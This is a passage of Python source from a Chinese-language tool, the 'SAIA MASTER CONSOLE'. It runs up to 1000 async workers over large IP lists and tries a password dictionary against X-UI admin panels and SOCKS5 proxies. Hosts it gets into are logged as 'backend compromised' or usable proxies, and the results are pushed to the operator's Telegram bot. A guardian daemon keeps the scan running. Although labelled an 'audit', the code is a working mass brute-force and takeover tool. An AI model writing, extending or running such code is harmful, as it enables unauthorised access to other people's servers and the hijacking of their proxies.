                    and now - last_interval_push_ts >= tg_interval_sec
                    and state.get("total", 0) > 0
                ):
                    verified_recent = [
                        x
                        for x in list(state.get("recent", []))
                        if is_verified_output_line(x)
                    ]
                    should_send_interval = bool(verified_recent)
                    snapshot = {
                        "done": state.get("done", 0),
                        "total": state.get("total", 0),
                        "xui_found": state.get("xui_found", 0),
                        "xui_verified": state.get("xui_verified", 0),
                        "s5_found": state.get("s5_found", 0),
                        "s5_verified": state.get("s5_verified", 0),
                    }
                    recent_lines = verified_recent[-5:]
                if (
                    tg_enabled
                    and now_dt.hour == 9
                    and now_dt.minute < 2
                    and last_daily_push_date != now_dt.strftime("%Y-%m-%d")
                ):
                    should_send_daily = True
            if state_snapshot is not None:
                save_state(STATE_FILE, state_snapshot)
            if checkpoint_targets is not None:
                save_state(
                    CHECKPOINT_FILE,
                    {
                        "session_key": session_key,
                        "updated_at": now,
                        "done_targets": checkpoint_targets,
                        "done": checkpoint_done,
                        "total": checkpoint_total,
                    },
                )
                last_checkpoint_saved_size = checkpoint_size
                last_checkpoint_saved_ts = now
            if should_send_interval:
                last_interval_push_ts = now
                schedule_telegram(build_interval_message(snapshot, recent_lines))
            if should_send_daily:
                last_daily_push_date = now_dt.strftime("%Y-%m-%d")
                schedule_telegram(build_daily_verified_message(now_dt))

    async def adaptive_conn_loop():
        current_limit = socket_limit
        while not flush_stop.is_set():
            await asyncio.sleep(ADAPT_CHECK_INTERVAL)
            mem_mb = get_available_memory_mb()
            queue_size = q.qsize()
            next_limit = current_limit

            if mem_mb is not None and mem_mb < ADAPT_LOW_MB:
                next_limit = max(adaptive_min, current_limit - ADAPT_STEP_DOWN)
            elif mem_mb is not None and mem_mb > ADAPT_HIGH_MB and queue_size > 0:
                next_limit = min(adaptive_max, current_limit + ADAPT_STEP_UP)

            if next_limit != current_limit:
                await conn_limiter.set_capacity(next_limit)
                current_limit = next_limit

            cap, in_use = await conn_limiter.snapshot()
            async with state_lock:
                state["socket_limit"] = cap
                state["socket_in_use"] = in_use
                state["free_mb"] = round(mem_mb, 1) if mem_mb is not None else None

    flusher = asyncio.create_task(flush_state_loop())
    adaptive_task = asyncio.create_task(adaptive_conn_loop())

    tokens = []
    token_file = resolve_token_file()
    if token_file:
        with open(token_file, "r", encoding="utf-8", errors="ignore") as f:
            for l in f:
                l = l.strip()
                if l:
                    tokens.append(l.split(":", 1) if ":" in l else ["admin", l])
    async with state_lock:
        state["tokens_loaded"] = len(tokens)

    async def worker():
        nonlocal special_or_sent, last_quick_persist_ts
        while True:
            ip = await q.get()
            if ip is None:
                q.task_done()
                break
            active_started = False
            try:
                async with state_lock:
                    state["current"] = f"Auditing -> {ip}"
                    state["current_ip"] = ip
                    state["active_workers"] = state.get("active_workers", 0) + 1
                    active_started = True

                async def handle_found_results(found_res):
                    if not found_res:
                        return
                    async with state_lock:
                        for r in found_res:
                            state["recent"] = (state["recent"] + [r])[-6:]
                    for r in found_res:
                        append_rotating(
                            REPORT_FILE,
                            r + "\n",
                            MAX_REPORT_BYTES,
                            REPORT_BACKUPS,
                        )
                        if ("[高危-后台沦陷]" in r) or ("[优质-真穿透]" in r):
                            record_verified_event(r)
                    if tg_enabled and tg_condition_mode in (1, 2, 3):
                        matched = [r for r in found_res if should_push_condition(r)]
                        if matched:
                            async with state_lock:
                                matched_snapshot = {
                                    "done": state.get("done", 0),
                                    "total": state.get("total", 0),
                                    "xui_found": state.get("xui_found", 0),
                                    "xui_verified": state.get("xui_verified", 0),
                                    "s5_found": state.get("s5_found", 0),
                                    "s5_verified": state.get("s5_verified", 0),
                                }
                            schedule_telegram(
                                build_interval_message(matched_snapshot, matched)
                            )

                if mode in (1, 3):
                    for p in xui_ports:
                        async with state_lock:
                            state["current_service"] = "XUI"
                            state["current_port"] = str(p)
                        x_r = await audit_xui(
                            ip,
                            p,
                            tokens,
                            state,
                            state_lock,
                            work_mode,
                            conn_limiter,
                            token_sem,
                        )
                        if x_r:
                            await handle_found_results([x_r])
                            break

                if mode in (2, 3):
                    for p in s5_ports:
                        async with state_lock:
                            state["current_service"] = "S5"
                            state["current_port"] = str(p)
                        s_r = await audit_socks5(
                            ip,
                            p,
                            tokens,
                            state,
                            state_lock,
                            work_mode,
                            conn_limiter,
                            token_sem,
                        )
                        if s_r:
                            await handle_found_results([s_r])
                            break
                quick_state_snapshot = None
                async with state_lock:
                    state["done"] += 1
                    state["current"] = f"Completed -> {ip}"
                    if resume_enabled:
                        done_targets.add(ip)
                    now = now_ts()
                    if now - last_quick_persist_ts >= 1.0:
                        last_quick_persist_ts = now
                        quick_state_snapshot = dict(state)
                    need_special_or_push = (
                        tg_enabled
                        and tg_condition_mode == 4
                        and not special_or_sent
                        and (
                            state.get("xui_verified", 0) + state.get("s5_verified", 0)
                            >= tg_verified_threshold
                        )
                    )
                    if need_special_or_push:
                        special_or_sent = True
                        special_snapshot = {
                            "done": state.get("done", 0),
                            "total": state.get("total", 0),
                            "xui_found": state.get("xui_found", 0),
                            "xui_verified": state.get("xui_verified", 0),
                            "s5_found": state.get("s5_found", 0),
                            "s5_verified": state.get("s5_verified", 0),
                        }
                        special_recent = list(state.get("recent", []))[-5:]
                    else:
                        special_snapshot = None
                        special_recent = []
                if quick_state_snapshot is not None:
                    save_state(STATE_FILE, quick_state_snapshot)
                if special_snapshot is not None:
                    schedule_telegram(
                        build_interval_message(special_snapshot, special_recent)
                    )
            except Exception:
                log_exception(f"worker crash ip={ip}")
                async with state_lock:
                    state["current"] = f"Worker error -> {ip}"
            finally:
                if active_started:
                    async with state_lock:
                        state["active_workers"] = max(
                            0, state.get("active_workers", 0) - 1
                        )
                q.task_done()

    workers = [asyncio.create_task(worker()) for _ in range(threads)]
    node_files = resolve_node_files()
    if not node_files:
        state["status"] = "completed"
        flush_stop.set()
        await asyncio.gather(flusher, adaptive_task, return_exceptions=True)
        save_state(STATE_FILE, state)
        return

    parse_est_total = 0
    try:
        for node_file in node_files:
            with open(node_file, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith("#"):
                        continue
                    for raw_target in line.split():
                        parse_est_total += estimate_expanded_target_count(raw_target)
    except OSError:
        pass
    if parse_est_total <= 0:
        parse_est_total = 1
    async with state_lock:
        state["parse_est_total"] = parse_est_total

    seen_targets = set()
    skipped_by_resume = 0
    skipped_by_history = 0
    scanned_ips = collect_reported_ips() if skip_scanned_enabled else set()
    try:
        for node_file in node_files:
            with open(node_file, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith("#"):
                        continue
                    for raw_target in line.split():
                        for target in iter_expanded_targets(raw_target):
                            if target in seen_targets:
                                continue
                            seen_targets.add(target)
                            async with state_lock:
                                state["total"] += 1
                                state["current"] = f"Parsing target -> {target}"

                            if resume_enabled and target in done_targets:
                                skipped_by_resume += 1
                                async with state_lock:
                                    state["done"] += 1
                                    state["skipped_resume"] += 1
                                continue

                            if skip_scanned_enabled and target in scanned_ips:
                                skipped_by_history += 1
                                async with state_lock:
                                    state["done"] += 1
                                    state["skipped_history"] += 1
                                continue

                            async with state_lock:
                                state["feed_total"] += 1
                                state["fed"] += 1
                                state["current"] = f"Feeding target -> {target}"

                            await q.put(target)
                            if feed_int > 0:
                                await asyncio.sleep(feed_int)
    except OSError:
        pass

    async with state_lock:
        state["feeding_done"] = True

    if skipped_by_resume > 0 or skipped_by_history > 0:
        async with state_lock:
            state["current"] = (
                f"Skip -> resume:{skipped_by_resume} history:{skipped_by_history}"
            )
        if skipped_by_resume > 0:
            log_event(f"Resume restored {skipped_by_resume} completed targets")
        if skipped_by_history > 0:
            log_event(f"History skipped {skipped_by_history} scanned targets")

    for _ in range(threads):
        await q.put(None)
    await asyncio.gather(*workers)
    state["status"] = "completed"
    state["current"] = "Completed"
    if tg_enabled:
        final_snapshot = {
            "done": state.get("done", 0),
            "total": state.get("total", 0),
            "xui_found": state.get("xui_found", 0),
            "xui_verified": state.get("xui_verified", 0),
            "s5_found": state.get("s5_found", 0),
            "s5_verified": state.get("s5_verified", 0),
        }
        final_recent = [
            x for x in list(state.get("recent", [])) if is_verified_output_line(x)
        ][-5:]
        if tg_condition_mode == 4:
            if (not special_or_sent) and final_recent:
                schedule_telegram(build_interval_message(final_snapshot, final_recent))
        else:
            if final_recent:
                schedule_telegram(build_interval_message(final_snapshot, final_recent))
    flush_stop.set()
    await asyncio.gather(flusher, adaptive_task, return_exceptions=True)
    if notify_tasks:
        await asyncio.gather(*list(notify_tasks), return_exceptions=True)
    if state.get("done", 0) >= state.get("total", 0):
        clear_checkpoint()
    save_state(STATE_FILE, state)


# ==================== 管理界面 (极光UI版) ====================


def main_console():
    # 动态加载旋转图标
    spinner = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
    spin_idx = 0
    panel_inner = 74
    panel_border = C_BLUE
    panel_rows = 8

    def visible_width(text):
        clean = re.sub(r"\x1b\[[0-9;]*m", "", text)
        width = 0
        for ch in clean:
            if unicodedata.combining(ch):
                continue
            if unicodedata.east_asian_width(ch) in ("W", "F"):
                width += 2
            else:
                width += 1
        return width

    def panel_line(text, inner=panel_inner):
        pad = max(0, inner - 1 - visible_width(text))
        return f"{panel_border}┃ {text}{' ' * pad}{panel_border}┃{C_W}"

    def build_panel(title, lines, inner=panel_inner, rows=panel_rows):
        top = f"{panel_border}┏{'━' * inner}┓{C_W}"
        sep = f"{panel_border}┣{'━' * inner}┫{C_W}"
        bottom = f"{panel_border}┗{'━' * inner}┛{C_W}"
        out = [top, panel_line(title, inner), sep]
        body = list(lines)[:rows]
        if len(body) < rows:
            body.extend([""] * (rows - len(body)))
        for line in body:
            out.append(panel_line(line, inner))
        out.append(bottom)
        return out

    def render_dual_panels(left_title, left_lines, right_title, right_lines):
        term_width = shutil.get_terminal_size((160, 40)).columns
        gap = "  "
        single_w = panel_inner + 2
        need_w = single_w * 2 + len(gap)
        if term_width < need_w:
            for ln in build_panel(left_title, left_lines):
                print(ln)
            print()
            for ln in build_panel(right_title, right_lines):
                print(ln)
            return
        left_panel = build_panel(left_title, left_lines)
        right_panel = build_panel(right_title, right_lines)
        for l, r in zip(left_panel, right_panel):
            print(l + gap + r)

    def fmt_dur(sec):
        sec = max(0, int(sec))
        h = sec // 3600
        m = (sec % 3600) // 60
        s = sec % 60
        return f"{h:02d}:{m:02d}:{s:02d}"

    disable_and_stop_guardian_processes()

    while True:
        sys.stdout.write("\x1b[H\x1b[J")
        sys.stdout.flush()
        s = load_state(STATE_FILE)
        g = load_state(GUARDIAN_STATE_FILE)
        resume_cfg = load_resume_config()
        tg_cfg = load_telegram_config()
        p_status = f"{C_W}ON{C_W}" if is_alive(s.get("pid")) else f"{C_DIM}OFF{C_W}"
        g_status = f"{C_W}ON{C_W}" if is_alive(g.get("pid")) else f"{C_DIM}OFF{C_W}"
        xui_audited = int(s.get("xui_found", 0))
        s5_audited = int(s.get("s5_found", 0))
        xui_verified = int(s.get("xui_verified", 0))
        s5_verified = int(s.get("s5_verified", 0))
        verifying_now = int(s.get("verifying_ip_count", 0))
        done = int(s.get("done", 0))
        total = int(s.get("total", 0))
        fed = int(s.get("fed", 0))
        parse_est_total = int(s.get("parse_est_total", 0))
        skipped_resume = int(s.get("skipped_resume", 0))
        skipped_history = int(s.get("skipped_history", 0))
        skipped_total = skipped_resume + skipped_history
        worker_done = max(0, done - skipped_total)
        parse_done = bool(s.get("feeding_done", False))
        parse_total = max(parse_est_total, total, 1)
        parse_bar = render_progress_bar(total, parse_total, width=24)
        feed_bar = render_progress_bar(fed, parse_total, width=24)
        progress_ratio = (worker_done / fed) if fed > 0 else 0.0
        progress_pct = progress_ratio * 100.0
        active_workers = int(s.get("active_workers", 0))
        socket_limit = int(s.get("socket_limit", 0))
        socket_in_use = int(s.get("socket_in_use", 0))
        current = str(s.get("current", "-"))
        if len(current) > 62:
            current = current[:62] + "..."
        local_free_mb = get_available_memory_mb()
        local_total_mb = get_total_memory_mb()
        local_cpu = get_cpu_usage_percent()
        mem_text = "-"
        if (
            isinstance(local_free_mb, (int, float))
            and isinstance(local_total_mb, (int, float))
            and local_total_mb > 0
        ):
            used_pct = max(
                0.0, min(100.0, (1.0 - local_free_mb / local_total_mb) * 100.0)
            )
            mem_text = f"{local_free_mb:.0f}/{local_total_mb:.0f}MB({used_pct:.1f}%)"
        elif isinstance(local_free_mb, (int, float)):
            mem_text = f"Free {local_free_mb:.0f}MB"
        cpu_text = f"{local_cpu:.1f}%" if isinstance(local_cpu, (int, float)) else "-"
        work_mode_text = work_mode_label(s.get("work_mode", 2))
        resume_status = (
            f"{C_W}ON{C_W}" if resume_cfg.get("enabled", True) else f"{C_DIM}OFF{C_W}"
        )
        tg_status = (
            f"{C_W}ON{C_W}"
            if tg_cfg.get("enabled")
            and tg_cfg.get("bot_token")
            and tg_cfg.get("chat_id")
            else f"{C_DIM}OFF{C_W}"
        )
        mode_text = mode_label(s.get("mode", 3))
        queue_size = int(s.get("queue_size", 0))
        tokens_loaded = int(s.get("tokens_loaded", 0))
        current_ip = str(s.get("current_ip", "-"))
        current_service = str(s.get("current_service", "-"))
        current_port = str(s.get("current_port", "-"))
        xui_ports_total = int(s.get("xui_ports_total", 0))
        s5_ports_total = int(s.get("s5_ports_total", 0))
        feed_interval = float(s.get("feed_interval", 0.0))
        run_status = str(s.get("status", "idle"))
        started_ts = float(s.get("started_at", now_ts()) or now_ts())
        uptime = fmt_dur(now_ts() - started_ts)

        left_lines = [
            f"{C_W}审计引擎:{p_status} {panel_border}| {C_W}自启守护:{g_status} {panel_border}| {C_W}断点续连:{resume_status} {panel_border}| {C_W}Telegram:{tg_status}",
            f"{C_W}解析:{C_CYAN}{total}{C_W}/{parse_total} ({'完成' if parse_done else '进行中'}) {panel_border}| {C_W}投喂:{C_CYAN}{fed}{C_W}/{parse_total} {panel_border}| {C_W}并行:{C_CYAN}{active_workers}{C_W} {panel_border}| {C_W}工作模式:{C_CYAN}{work_mode_text}",
            f"{C_W}投喂消化:{C_CYAN}{worker_done}{C_W}/{fed} ({C_CYAN}{progress_pct:5.1f}%{C_W})",
            f"{C_W}全体进度(含跳过): {parse_bar}  跳过:{C_CYAN}{skipped_total}{C_W}",
            f"{C_W}投喂进度条      : {feed_bar}",
            f"{C_W}XUI 已审计:{C_CYAN}{xui_audited}{C_W} / 已验真:{C_CYAN}{xui_verified}{C_W} {panel_border}| {C_W}S5 已审计:{C_CYAN}{s5_audited}{C_W} / 已验真:{C_CYAN}{s5_verified}{C_W} {panel_border}| {C_W}验证中:{C_CYAN}{verifying_now}",
            f"{C_W}Socket:{C_CYAN}{socket_in_use}{C_W}/{socket_limit} {panel_border}| {C_W}CPU:{C_CYAN}{cpu_text}{C_W} {panel_border}| {C_W}内存:{C_CYAN}{mem_text}{C_W}",
            f"{C_W}当前:{C_DIM}{current}{C_W}",
        ]

        right_lines = [
            f"{C_W}状态:{C_CYAN}{run_status}{C_W} {panel_border}| {C_W}模式:{C_CYAN}{mode_text}{C_W} {panel_border}| {C_W}运行:{C_CYAN}{uptime}{C_W}",
            f"{C_W}PID:{C_CYAN}{int(s.get('pid', 0) or 0)}{C_W} {panel_border}| {C_W}队列深度:{C_CYAN}{queue_size}{C_W} {panel_border}| {C_W}喂入间隔:{C_CYAN}{feed_interval:.3f}s{C_W}",
            f"{C_W}扫描目标 IP:{C_CYAN}{current_ip}{C_W}",
            f"{C_W}扫描服务:{C_CYAN}{current_service}{C_W} {panel_border}| {C_W}当前端口:{C_CYAN}{current_port}{C_W}",
            f"{C_W}端口装载 XUI:{C_CYAN}{xui_ports_total}{C_W} {panel_border}| {C_W}S5:{C_CYAN}{s5_ports_total}{C_W}",
            f"{C_W}字典口令加载:{C_CYAN}{tokens_loaded}{C_W} 条",
            f"{C_W}跳过统计 断点:{C_CYAN}{skipped_resume}{C_W} {panel_border}| 历史:{C_CYAN}{skipped_history}{C_W}",
            f"{C_W}连接占用 Socket:{C_CYAN}{socket_in_use}{C_W}/{socket_limit}",
        ]

        render_dual_panels(
            "SAIA MASTER CONSOLE v23.5 | 旗舰穿透版",
            left_lines,
            "MONITOR DETAIL | 运行细节",
            right_lines,
        )

        print(f"\n{C_CYAN} [ 核心指令 ]{C_W}")
        print(f" 1) 启动审计             2) 监控面板             3) X-UI审计/验真")
        print(f" 4) 查看日志             5) 停止审计             6) 启动守护")
        print(f" 7) 断点续连             8) 停止守护             9) 退出系统")
        print(f"10) Telegram推送        11) S5审计/验真        12) 进料加速策略")
        print(f"13) 分类清理结果        14) 疑似无L7列表        15) 一键清理")
        print(f"16) 更换IP列表          17) 更新Tokens")

        try:
            c = timed_input(
                f"\n{C_BLUE}┌──({C_W}root@saia{C_BLUE})-[{C_W}~/menu{C_BLUE}]\n└─{C_WARN}# {C_W}",
                timeout_sec=10.0,
            ).strip()
        except KeyboardInterrupt:
            print(f"\n{C_DIM}已取消输入，返回主菜单刷新...{C_W}")
            time.sleep(0.4)
            continue
        if not c:
            continue

        if c == "1":
            running_pid = load_state(STATE_FILE).get("pid")
            if is_alive(running_pid):
                print(
                    f"{C_WARN}>>> 已有审计进程运行中(PID {running_pid})，请先停止再启动{C_W}"
                )
                time.sleep(1.2)
                continue
            print(f"\n{C_CYAN}>>> 配置审计参数{C_W}")
            m = prompt_int(
                "模式 (1.XUI / 2.S5 / 3.全能): ", default=3, min_value=1, max_value=3
            )
            wm = prompt_int(
                "深度 (1.探索 / 2.探索+验真 / 3.只留极品): ",
                default=2,
                min_value=1,
                max_value=3,
            )
            th = prompt_int(
                "线程 (默认 1000): ", default=1000, min_value=1, max_value=1000
            )
            default_ports = (
                DEFAULT_XUI_PORTS
                if m == 1
                else DEFAULT_S5_PORTS
                if m == 2
                else DEFAULT_MIXED_PORTS
            )
            ps = input(f"端口 (默认 {default_ports[:20]}...): ") or default_ports
            if not parse_ports(ps):
                print("端口无效")
                time.sleep(1)
                continue
            fi = prompt_float(
                "喂IP间隔秒 (默认0.02, 0=最快): ", default=0.02, min_value=0.0
            )
            subprocess.Popen(
                [
                    sys.executable,
                    __file__,
                    "run",
                    str(m),
                    str(wm),
                    str(th),
                    ps,
                    str(fi),
                ],
                start_new_session=True,
            )
            print(f"{C_SUCC}>>> 核心已启动!{C_W}")
            time.sleep(1)

        elif c == "2":
            while True:
                if poll_zero_to_back(0.05):
                    break
                st = load_state(STATE_FILE)
                spin_char = spinner[spin_idx % len(spinner)]
                spin_idx += 1
                done = st.get("done", 0)
                total = st.get("total", 0)
                bar = render_progress_bar(done, total)
                recent_lines = list(st.get("recent", []))
                xui_recent_raw = [
                    l
                    for l in recent_lines
                    if "[XUI_VERIFIED]" in l or "[高危-后台沦陷]" in l
                ]
                s5_recent_raw = [
                    l
                    for l in recent_lines
                    if "[S5_VERIFIED]" in l or "[优质-真穿透]" in l
                ]
                xui_recent = [format_result_line(l, "xui") for l in xui_recent_raw[-3:]]
                s5_recent = [
                    format_result_line(l, "socks5") for l in s5_recent_raw[-3:]
                ]

                cur_service = str(st.get("current_service", "-"))
                cur_ip = str(st.get("current_ip", "-"))
                cur_port = str(st.get("current_port", "-"))
                cur_target = f"{cur_service} {cur_ip}:{cur_port}"
                if len(cur_target) > 28:
                    cur_target = cur_target[:28]
                cur_action = str(st.get("current", "-"))
                if len(cur_action) > 24:
                    cur_action = cur_action[:24]

                os.system("cls" if os.name == "nt" else "clear")
                print(
                    f"{C_BLUE}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓{C_W}"
                )
                print(
                    f"{C_BLUE}┃ {C_W}{spin_char} {C_BOLD}REAL-TIME MONITOR{C_W}       | {C_DIM}Mode: {work_mode_label(st.get('work_mode', 2))}{C_BLUE}       ┃{C_W}"
                )
                print(
                    f"{C_BLUE}┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫{C_W}"
                )
                print(
                    f"{C_BLUE}┃ {C_W}X-UI 面板  {C_BLUE}|{C_W} 发现: {C_CYAN}{st.get('xui_found', 0):<6}{C_W} | 沦陷: {C_WARN}{st.get('xui_verified', 0):<6}{C_BLUE} ┃{C_W}"
                )
                print(
                    f"{C_BLUE}┃ {C_W}SOCKS5代理 {C_BLUE}|{C_W} 连通: {C_CYAN}{st.get('s5_found', 0):<6}{C_W} | 穿透: {C_SUCC}{st.get('s5_verified', 0):<6}{C_BLUE} ┃{C_W}"
                )
                print(
                    f"{C_BLUE}┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫{C_W}"
                )
                print(
                    f"{C_BLUE}┃ {C_W}当前目标   {C_BLUE}|{C_CYAN} {cur_target:<28}{C_W} 并行:{st.get('active_workers', 0):<4} {C_BLUE}┃{C_W}"
                )
                print(
                    f"{C_BLUE}┃ {C_W}当前动作   {C_BLUE}|{C_DIM} {cur_action:<24} 验证中:{st.get('verifying_ip_count', 0):<4} {C_BLUE}┃{C_W}"
                )
                print(f"{C_BLUE}┃ {C_W}总体进度   {C_BLUE}|{C_W} {bar} {C_BLUE}┃{C_W}")
                print(
                    f"{C_BLUE}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛{C_W}"
                )
                print(f"\n{C_CYAN}[已验真结果 - XUI]{C_W}")
                print("\n".join(xui_recent) if xui_recent else f"{C_DIM}-{C_W}")
                print(f"\n{C_CYAN}[已验真结果 - S5真穿透]{C_W}")
                print("\n".join(s5_recent) if s5_recent else f"{C_DIM}-{C_W}")
                print(f"\n{C_DIM}输入 0 返回主菜单...{C_W}")
                if poll_zero_to_back(0.35):
                    break

        elif c == "3":
            try:
                last_sig = None
                while True:
                    st = load_state(STATE_FILE)
                    xui_audited, xui_verified, _, _ = collect_report_sections(
                        limit=None
                    )
                    sig = (
                        len(xui_audited),
                        len(xui_verified),
                        xui_audited[-1] if xui_audited else "",
                        xui_verified[-1] if xui_verified else "",
                    )
                    if sig != last_sig:
                        last_sig = sig
                        os.system("cls" if os.name == "nt" else "clear")
                        print(f"\n{C_CYAN}>>> X-UI 审计实时面板{C_W}")
                        print(
                            f"发现: {C_CYAN}{len(xui_audited)}{C_W} | 验证成功: {C_WARN}{len(xui_verified)}{C_W}"
                        )
                        print(
                            f"最新IP: 审计 {C_CYAN}{latest_ip_port(xui_audited)}{C_W} | 验真 {C_WARN}{latest_ip_port(xui_verified)}{C_W}"
                        )
                        print(f"\n{C_CYAN}[X-UI 发现]{C_W}\n")
                        print(
                            "\n".join(format_result_line(l, "xui") for l in xui_audited)
                            if xui_audited
                            else f"{C_DIM}暂无X-UI审计数据{C_W}"
                        )
                        print(f"\n{C_CYAN}[X-UI 验证成功]{C_W}\n")
                        print(
                            "\n".join(
                                format_result_line(l, "xui") for l in xui_verified
                            )
                            if xui_verified
                            else f"{C_DIM}暂无X-UI验真数据{C_W}"
                        )
                        print(f"\n{C_DIM}输入 0 返回主菜单...{C_W}")
                    if poll_zero_to_back(0.5):
                        break
            except KeyboardInterrupt:
                pass

        elif c == "4":
            output = read_last_lines(LOG_FILE, lines=50)
            print(f"\n{C_CYAN}>>> 系统日志{C_W}\n")
            print(output if output else f"{C_DIM}暂无日志{C_W}")
            wait_for_zero_return(f"\n{C_BLUE}输入 0 返回...{C_W}")

        elif c == "5":
            disable_and_stop_guardian_processes()
            pid = load_state(STATE_FILE).get("pid")
            if stop_process(pid):
                st = load_state(STATE_FILE)
                if isinstance(st, dict):
                    st["status"] = "manual_stopped"
                    st["current"] = "Stopped manually"
                    st["updated_at"] = now_ts()
                    save_state(STATE_FILE, st)
                print(f"{C_WARN}>>> 审计任务已强制停止{C_W}")
            else:
                print(f"{C_DIM}没有运行中的任务{C_W}")
            time.sleep(1)

        elif c == "6":
            # 守护进程启动逻辑 (保持不变)
            m = prompt_int("守护模式 (3): ", default=3, min_value=1, max_value=3)
            th = prompt_int(
                "守护线程 (1000): ", default=1000, min_value=1, max_value=1000
            )
            default_ports = (
                DEFAULT_XUI_PORTS
                if m == 1
                else DEFAULT_S5_PORTS
                if m == 2
                else DEFAULT_MIXED_PORTS
            )
            ps = input(f"端口 (默认 {default_ports[:20]}...): ") or default_ports
            if not parse_ports(ps):
                print("端口无效")
                time.sleep(1)
                continue
            set_guardian_enabled(True)
            subprocess.Popen(
                [
                    sys.executable,
                    __file__,
                    "guardian",
                    str(m),
                    "2",
                    str(th),
                    ps,
                    "0.05",
                    "20",
                    "256",
                ],
                start_new_session=True,
            )
            print(f"{C_SUCC}>>> 守护进程已启动{C_W}")
            time.sleep(1)

        elif c == "7":
            rcfg = load_resume_config()
            print(f"\n{C_CYAN}>>> 断点续连配置{C_W}")
            print(f"当前状态: {'启用' if rcfg.get('enabled', True) else '关闭'}")
            print(f"已扫跳过: {'启用' if rcfg.get('skip_scanned', False) else '关闭'}")
            print("1) 开启续连  2) 关闭续连  3) 清空断点")
            print("4) 开启已扫跳过  5) 关闭已扫跳过")
            sel = input("请选择 (输入 0 返回): ").strip()
            if sel == "0":
                continue
            if sel == "1":
                rcfg["enabled"] = True
                save_resume_config(rcfg)
                print(f"{C_SUCC}>>> 已开启断点续连{C_W}")
            elif sel == "2":
                rcfg["enabled"] = False
                save_resume_config(rcfg)
                print(f"{C_WARN}>>> 已关闭断点续连{C_W}")
            elif sel == "3":
                clear_checkpoint()
                print(f"{C_SUCC}>>> 断点记录已清空{C_W}")
            elif sel == "4":
                rcfg["skip_scanned"] = True
                save_resume_config(rcfg)
                print(f"{C_SUCC}>>> 已开启已扫跳过(按结果历史){C_W}")
                print(f"{C_DIM}下一次启动审计生效{C_W}")
            elif sel == "5":
                rcfg["skip_scanned"] = False
                save_resume_config(rcfg)
                print(f"{C_WARN}>>> 已关闭已扫跳过{C_W}")
            time.sleep(1)

        elif c == "12":
            fcfg = load_feed_turbo_config()
            print(f"\n{C_CYAN}>>> 进料加速策略{C_W}")
            print("规则: 剩余比例<=触发阈值时加速, 剩余比例<=冲刺阈值时不再等待")
            print(
                f"当前: 触发阈值={fcfg.get('accel_trigger_ratio', 0.5):.2f} | 冲刺阈值={fcfg.get('final_rush_ratio', 0.1):.2f} | 加速系数={fcfg.get('accel_factor', 0.5):.2f}"
            )
            print("输入 0 返回主菜单，留空表示保持当前值")

            raw_trigger = input("触发阈值(0-1, 默认0.50): ").strip()
            if raw_trigger == "0":
                continue
            raw_final = input("冲刺阈值(0-1, 默认0.10): ").strip()
            if raw_final == "0":
                continue
            raw_factor = input("加速系数(0-1, 默认0.50, 越小越快): ").strip()
            if raw_factor == "0":
                continue

            if raw_trigger:
                try:
                    fcfg["accel_trigger_ratio"] = max(0.0, min(1.0, float(raw_trigger)))
                except ValueError:
                    print("触发阈值无效，保持原值")
            if raw_final:
                try:
                    fcfg["final_rush_ratio"] = max(0.0, min(1.0, float(raw_final)))
                except ValueError:
                    print("冲刺阈值无效，保持原值")
            if raw_factor:
                try:
                    fcfg["accel_factor"] = max(0.0, min(1.0, float(raw_factor)))
                except ValueError:
                    print("加速系数无效，保持原值")

            if fcfg.get("final_rush_ratio", 0.1) > fcfg.get("accel_trigger_ratio", 0.5):
                fcfg["final_rush_ratio"] = fcfg.get("accel_trigger_ratio", 0.5)
                print("冲刺阈值不能大于触发阈值，已自动调整")

            save_feed_turbo_config(fcfg)
            print(f"{C_SUCC}>>> 进料加速策略已保存{C_W}")
            print(f"{C_DIM}提示: 新策略会在下一次启动审计时生效{C_W}")
            time.sleep(1.5)

        elif c == "10":
            cfg = load_telegram_config()
            print(f"\n{C_CYAN}>>> Telegram 推送配置{C_W}")
            print(
                f"当前状态: {'启用' if cfg.get('enabled') else '关闭'} | 条件: {telegram_condition_label(cfg.get('condition_mode', 2))} | 定时: {cfg.get('interval_minutes', 0)} 分钟 | 验真阈值: {cfg.get('verified_threshold', 5)}"
            )
            print("输入 0 返回主菜单，留空表示保持当前值")
            token = input("Bot Token: ").strip()
            if token == "0":
                continue
            chat_id = input("Chat ID: ").strip()
            if chat_id == "0":
                continue
            en_raw = input("启用推送? (y/n, 默认保持): ").strip().lower()
            if en_raw == "0":
                continue
            interval_raw = input("定时推送间隔分钟 (0=关闭, 默认保持): ").strip()
            cond_raw = input(
                "条件推送 (0关闭/1验真即推/2仅验真/3验真聚合/4完成或验真>=阈值(单次), 默认保持): "
            ).strip()
            th_raw = input("验真阈值 (默认5, 仅模式4生效, 默认保持): ").strip()
            test_raw = input("保存后发送测试消息? (y/n): ").strip().lower()

            if token:
                cfg["bot_token"] = token
            if chat_id:
                cfg["chat_id"] = chat_id
            if en_raw in ("y", "n"):
                cfg["enabled"] = en_raw == "y"
            if interval_raw:
                try:
                    cfg["interval_minutes"] = max(0, int(interval_raw))
                except ValueError:
                    print("间隔输入无效，保持原值")
            if cond_raw:
                try:
                    cond_mode = int(cond_raw)
                    if cond_mode in (0, 1, 2, 3, 4):
                        cfg["condition_mode"] = cond_mode
                    else:
                        print("条件模式无效，保持原值")
                except ValueError:
                    print("条件输入无效，保持原值")
            if th_raw:
                try:
                    cfg["verified_threshold"] = max(1, int(th_raw))
                except ValueError:
                    print("阈值输入无效，保持原值")

            save_telegram_config(cfg)
            print(f"{C_SUCC}>>> Telegram 配置已保存{C_W}")
            if test_raw == "y":
                ok, detail = send_telegram_message(
                    cfg.get("bot_token", ""),
                    cfg.get("chat_id", ""),
                    "SAIA 测试消息: Telegram 推送配置已生效。",
                )
                if ok:
                    print(f"{C_SUCC}>>> 测试消息发送成功{C_W}")
                else:
                    print(f"{C_WARN}>>> 测试消息发送失败: {detail}{C_W}")
            time.sleep(1)

